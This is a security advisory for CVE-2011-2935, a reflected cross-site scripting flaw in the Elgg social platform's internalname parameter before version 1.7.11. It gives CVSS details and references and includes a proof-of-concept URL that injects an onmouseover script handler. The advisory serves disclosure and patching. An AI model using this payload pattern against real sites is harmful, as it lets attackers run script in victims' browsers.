# [M] Elgg Reflected XSS Vulnerability

## Summary
Severity: Medium
Advisory: GHSA-mcfm-j5g6-w26f
CVE: CVE-2011-2935
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2022-04-22
Source: https://github.com/advisories/GHSA-mcfm-j5g6-w26f
Type: github-advisory

## Affected
- Packagist: `elgg/elgg` — affected >=0 <1.7.11

## Details
### VULNERABILITY DESCRIPTION
The `internalname` parameter is not properly sanitized, which allows attacker to conduct Cross Site Scripting attack. This may allow an attacker to create a specially crafted URL that would execute arbitrary script code in a victim's browser

### PROOF-OF-CONCEPT/EXPLOIT
```http
http://localhost/pg/embed/media?internalname=%20%22onmouseover=%22alert%28/XSS/%29%22style=%22width:3000px!important;height:3000px!important;z-index:999999;position:absolute!important;left:0;top:0;%22%20x=%22
```

## References
- https://nvd.nist.gov/vuln/detail/CVE-2011-2935
- https://github.com/Elgg/Elgg/issues/3544
- https://github.com/Elgg/Elgg/commit/2843b4f846874d434a2403ac1f27e41035b45e04
- https://github.com/Elgg/Elgg
- https://oss-security.openwall.narkive.com/1UH3NYx8/cve-request-elgg-1-7-10-multiple-vulnerabilities
- https://security-tracker.debian.org/tracker/CVE-2011-2935
- https://web.archive.org/web/20110907122607/http://blog.elgg.org/pg/blog/brett/read/189/elgg-1711-released
- http://yehg.net/lab/pr0js/advisories/[elgg_1710]_xss_sqlin
